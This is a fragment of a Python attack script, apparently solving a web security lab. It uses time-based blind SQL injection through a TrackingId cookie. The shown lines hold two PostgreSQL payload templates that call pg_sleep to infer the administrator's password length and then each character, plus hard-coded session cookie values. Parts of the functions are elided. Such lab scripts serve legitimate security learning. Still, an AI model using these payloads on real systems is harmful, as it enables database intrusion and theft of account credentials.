...
def guess_char(
    ...
    sqli_template = "' || (SELECT CASE WHEN ASCII(SUBSTR(password, {0}, 1)) {1} '{2}' THEN pg_sleep(5) ELSE '' END FROM users WHERE username='administrator')-- "
...
def guess_password_length(
    ...
    sqli_template = "' || (SELECT CASE WHEN LENGTH(password) {0} {1} THEN pg_sleep(5) ELSE '' END FROM users WHERE username='administrator')-- "
...
if __name__ == "__main__":
    ...
    cookies = {
        "TrackingId": "nZq1ZGJXW5sLHuuf",
        "session": "9pwUOn2owb7GNJwpRusyvtIvoChd7sLI",
    }
